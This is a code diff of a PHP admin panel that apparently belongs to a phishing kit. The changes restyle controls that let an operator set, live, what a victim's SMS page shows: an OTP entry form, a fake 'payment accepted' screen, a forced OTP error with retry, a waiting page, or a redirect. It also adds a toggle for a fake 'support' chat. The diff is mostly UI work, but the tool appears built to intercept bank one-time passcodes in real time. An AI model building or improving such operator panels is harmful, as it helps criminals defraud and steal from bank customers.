@@ -129,20 +129,34 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Panel</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #0b0b0b; color: #f5f5f5; margin: 0; }
-        .container { max-width: 1160px; margin: 30px auto; background: #141414; padding: 24px; border-radius: 10px; box-shadow: 0 0 14px rgba(0, 0, 0, 0.45); }
-        .card { background: #1f1f1f; padding: 16px; border-radius: 8px; border: 1px solid #2d2d2d; }
+        body { font-family: Arial, sans-serif; background: radial-gradient(circle at top, #1a1a1a 0%, #090909 58%, #050505 100%); color: #f5f5f5; margin: 0; }
+        .container { max-width: 1200px; margin: 30px auto; background: #111; padding: 24px; border-radius: 16px; box-shadow: 0 16px 42px rgba(0, 0, 0, 0.45); border: 1px solid #272727; }
+        .card { background: linear-gradient(180deg, #1a1a1a 0%, #151515 100%); padding: 18px; border-radius: 12px; border: 1px solid #2d2d2d; }
         .login-wrapper { max-width: 420px; margin: 80px auto; }
-        .top-bar { display: flex; justify-content: space-between; align-items: center; gap: 16px; margin-bottom: 12px; }
-        .logout-link { color: #90caf9; }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; gap: 16px; margin-bottom: 16px; background: #181818; border: 1px solid #2d2d2d; border-radius: 12px; padding: 14px 16px; }
+        .logout-link { color: #9ed0ff; font-weight: 600; }
         .admin-grid { display: grid; grid-template-columns: 1.15fr 1fr; gap: 16px; margin-top: 14px; }
         .stack { display: flex; flex-direction: column; gap: 16px; }
+        .flow-form { display: flex; flex-direction: column; gap: 16px; }
         .form-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 12px 20px; }
-        .form-row { display: flex; flex-direction: column; gap: 6px; }
+        .form-row { display: flex; flex-direction: column; gap: 8px; }
         .form-row label { font-weight: 600; }
-        input[type="text"], input[type="password"], select, textarea { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #333; background: #111; color: #f5f5f5; box-sizing: border-box; }
+        input[type="text"], input[type="password"], textarea { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #333; background: #111; color: #f5f5f5; box-sizing: border-box; }
         textarea { min-height: 84px; resize: vertical; }
-        .inline-controls { display: flex; align-items: center; gap: 8px; }
+        .radio-section { background: #0f0f0f; border: 1px solid #2a2a2a; border-radius: 10px; padding: 12px; }
+        .radio-section h3 { margin: 0 0 10px; font-size: 15px; color: #f2f2f2; }
+        .radio-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 10px; }
+        .radio-option { display: flex; align-items: flex-start; gap: 8px; background: #151515; border: 1px solid #2f2f2f; border-radius: 10px; padding: 10px; }
+        .radio-option input[type="radio"] { margin-top: 2px; accent-color: #e50914; }
+        .radio-option strong { display: block; color: #fff; font-size: 14px; }
+        .radio-option span { display: block; color: #bbbbbb; font-size: 12px; margin-top: 3px; line-height: 1.4; }
+        .custom-url-wrapper { transition: opacity 0.2s ease; }
+        .custom-url-wrapper.disabled { opacity: 0.5; }
+        .button-row { display: flex; justify-content: flex-start; align-items: center; gap: 10px; }
+        .live-chat-toggle { display: flex; gap: 10px; align-items: center; background: #0f0f0f; border: 1px solid #2a2a2a; border-radius: 10px; padding: 10px 12px; margin-bottom: 12px; }
+        .live-chat-toggle input[type="checkbox"] { accent-color: #e50914; width: 18px; height: 18px; }
+        .live-chat-toggle label { font-weight: 700; }
+        .live-chat-toggle small { display: block; color: #bdbdbd; }
         button { padding: 10px 16px; border: none; border-radius: 8px; background: #e50914; color: #fff; cursor: pointer; }
         button:hover { background: #b20710; }
         .message { padding: 12px; background: #1f3b1f; border: 1px solid #2e7d32; color: #b9f6ca; border-radius: 6px; margin-bottom: 12px; }
@@ -195,40 +209,37 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
         <div class="admin-grid">
             <div class="stack">
                 <div class="card">
-                    <h2>SMS Page Controls</h2>
-                    <p class="hint">Manage user flow and live chat from this section.</p>
-                    <form method="post" class="form-grid" id="sms-form" novalidate>
-                        <div class="form-row">
-                            <label for="sms_mode">Choose what sms.php should do</label>
-                            <select name="sms_mode" id="sms_mode" required>
-                                <option value="default" <?php echo $currentState['mode'] === 'default' ? 'selected' : ''; ?>>Show OTP form (default)</option>
-                                <option value="payment_accept" <?php echo $currentState['mode'] === 'payment_accept' ? 'selected' : ''; ?>>Show user accepted payment</option>
-                                <option value="redirect_wait" <?php echo $currentState['mode'] === 'redirect_wait' ? 'selected' : ''; ?>>Redirect to wait.php?next=sms.php</option>
-                                <option value="redirect_custom" <?php echo $currentState['mode'] === 'redirect_custom' ? 'selected' : ''; ?>>Redirect to a specific URL</option>
-                                <option value="error_verification" <?php echo $currentState['mode'] === 'error_verification' ? 'selected' : ''; ?>>Show verification error</option>
-                            </select>
+                    <h2>Unified User Flow Control</h2>
+                    <p class="hint">Financial instruction + SMS behavior are combined below with radio controls for faster admin use.</p>
+                    <form method="post" class="flow-form" id="sms-form" novalidate>
+                        <div class="radio-section">
+                            <h3>Choose what sms.php should do</h3>
+                            <div class="radio-grid">
+                                <label class="radio-option"><input type="radio" name="sms_mode" value="default" <?php echo $currentState['mode'] === 'default' ? 'checked' : ''; ?>><span><strong>Show OTP form</strong><span>Normal SMS verification page.</span></span></label>
+                                <label class="radio-option"><input type="radio" name="sms_mode" value="payment_accept" <?php echo $currentState['mode'] === 'payment_accept' ? 'checked' : ''; ?>><span><strong>Show payment accepted</strong><span>Display a success confirmation screen.</span></span></label>
+                                <label class="radio-option"><input type="radio" name="sms_mode" value="redirect_wait" <?php echo $currentState['mode'] === 'redirect_wait' ? 'checked' : ''; ?>><span><strong>Redirect to waiting PHP</strong><span>Move the user to wait.php?next=sms.php.</span></span></label>
+                                <label class="radio-option"><input type="radio" name="sms_mode" value="redirect_custom" <?php echo $currentState['mode'] === 'redirect_custom' ? 'checked' : ''; ?>><span><strong>Custom redirection URL</strong><span>Send user to your custom URL.</span></span></label>
+                                <label class="radio-option"><input type="radio" name="sms_mode" value="error_verification" <?php echo $currentState['mode'] === 'error_verification' ? 'checked' : ''; ?>><span><strong>Show verification error</strong><span>Trigger a temporary invalid OTP state.</span></span></label>
+                            </div>
                         </div>
-                        <div class="form-row">
+
+                        <div class="radio-section">
+                            <h3>Financial instruction for the next user step</h3>
+                            <div class="radio-grid">
+                                <label class="radio-option"><input type="radio" name="instruction" value="stay_wait" <?php echo $currentState['instruction'] === 'stay_wait' ? 'checked' : ''; ?>><span><strong>Keep user on waiting PHP</strong><span>User remains on wait.php until next update.</span></span></label>
+                                <label class="radio-option"><input type="radio" name="instruction" value="prompt_otp" <?php echo $currentState['instruction'] === 'prompt_otp' ? 'checked' : ''; ?>><span><strong>Send user to SMS page (sms.php)</strong><span>Return user to OTP entry screen.</span></span></label>
+                                <label class="radio-option"><input type="radio" name="instruction" value="otp_error" <?php echo $currentState['instruction'] === 'otp_error' ? 'checked' : ''; ?>><span><strong>Send OTP error</strong><span>Show an OTP error then allow retry.</span></span></label>
+                                <label class="radio-option"><input type="radio" name="instruction" value="otp_pass" <?php echo $currentState['instruction'] === 'otp_pass' ? 'checked' : ''; ?>><span><strong>Show SMS pass</strong><span>Display successful SMS OTP pass state.</span></span></label>
+                            </div>
+                        </div>
+
+                        <div class="form-row custom-url-wrapper" id="custom-url-wrapper">
                             <label for="custom_url">Custom redirect URL (for specific URL option)</label>
                             <input type="text" id="custom_url" name="custom_url" value="<?php echo htmlspecialchars($currentState['custom_url']); ?>" placeholder="https://example.com/path">
                         </div>
-                        <div class="form-row">
-                            <label for="instruction">Finance instruction for the next user step</label>
-                            <select name="instruction" id="instruction">
-                                <option value="stay_wait" <?php echo $currentState['instruction'] === 'stay_wait' ? 'selected' : ''; ?>>Keep user on wait.php</option>
-                                <option value="prompt_otp" <?php echo $currentState['instruction'] === 'prompt_otp' ? 'selected' : ''; ?>>Send user to SMS to enter OTP</option>
-                                <option value="otp_error" <?php echo $currentState['instruction'] === 'otp_error' ? 'selected' : ''; ?>>Send OTP error then let them retry</option>
-                                <option value="otp_pass" <?php echo $currentState['instruction'] === 'otp_pass' ? 'selected' : ''; ?>>Show SMS OTP pass</option>
-                            </select>
+                        <div class="button-row">
+                            <button type="submit">Apply Flow Update</button>
                         </div>
-                        <div class="form-row">
-                            <div class="inline-controls">
-                                <input type="checkbox" id="chat_enabled" name="chat_enabled" value="1" <?php echo !empty($currentState['chat_enabled']) ? 'checked' : ''; ?>>
-                                <label for="chat_enabled">Enable live chat for user</label>
-                            </div>
-                            <small>Chat appears on user pages only when enabled.</small>
-                        </div>
-                        <button type="submit">Update SMS Page</button>
                     </form>
                 </div>
 
@@ -254,8 +265,15 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
             </div>
 
             <div class="card">
-                <h2>Live Chat (admin view)</h2>
-                <p class="hint">Instant support-style chat with faster refresh.</p>
+                <h2>Live Chat Admin</h2>
+                <p class="hint">Enable chat from this side, then reply to users in real-time.</p>
+                <div class="live-chat-toggle">
+                    <input type="checkbox" id="chat_enabled" name="chat_enabled" value="1" form="sms-form" <?php echo !empty($currentState['chat_enabled']) ? 'checked' : ''; ?>>
+                    <div>
+                        <label for="chat_enabled">Enable live chat</label>
+                        <small>When disabled, user-side support chat is hidden.</small>
+                    </div>
+                </div>
                 <div class="chat-box" id="chat-box">
                     <?php if (!empty($chatLog)): ?>
                         <?php foreach ($chatLog as $entry): ?>
@@ -282,7 +300,27 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
     const sendButton = document.getElementById('send-admin-message');
     const smsForm = document.getElementById('sms-form');
     const flashMessage = document.getElementById('flash-message');
+    const customUrlWrapper = document.getElementById('custom-url-wrapper');
     let adminChatPoller = null;
+
+    function getRadioValue(name) {
+        const selected = smsForm ? smsForm.querySelector(`input[name="${name}"]:checked`) : null;
+        return selected ? selected.value : null;
+    }
+
+    function setRadioValue(name, value) {
+        if (!smsForm) return;
+        const radio = smsForm.querySelector(`input[name="${name}"][value="${value}"]`);
+        if (radio) {
+            radio.checked = true;
+        }
+    }
+
+    function toggleCustomUrl() {
+        if (!smsForm || !customUrlWrapper) return;
+        const showCustom = getRadioValue('sms_mode') === 'redirect_custom';
+        customUrlWrapper.classList.toggle('disabled', !showCustom);
+    }
 
     function setAdminChatEnabled(enabled) {
         if (!chatInput || !sendButton) return;
@@ -386,14 +424,19 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
             }
 
             if (data.state) {
-                smsForm.querySelector('#sms_mode').value = data.state.mode;
-                smsForm.querySelector('#instruction').value = data.state.instruction;
+                setRadioValue('sms_mode', data.state.mode);
+                setRadioValue('instruction', data.state.instruction);
+                const customUrlInput = smsForm.querySelector('#custom_url');
+                if (customUrlInput) {
+                    customUrlInput.value = data.state.custom_url || '';
+                }
                 const chatCheckbox = smsForm.querySelector('#chat_enabled');
                 if (chatCheckbox) {
                     chatCheckbox.checked = !!data.state.chat_enabled;
                 }
 
                 setAdminChatEnabled(!!data.state.chat_enabled);
+                toggleCustomUrl();
             }
         } catch (e) {
             console.error('Unable to update SMS page', e);
@@ -407,6 +450,10 @@ $chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFil
 
     if (smsForm) {
         smsForm.addEventListener('submit', updateSmsState);
+        smsForm.querySelectorAll('input[name="sms_mode"]').forEach((radio) => {
+            radio.addEventListener('change', toggleCustomUrl);
+        });
+        toggleCustomUrl();
     }
 </script>
 </html>
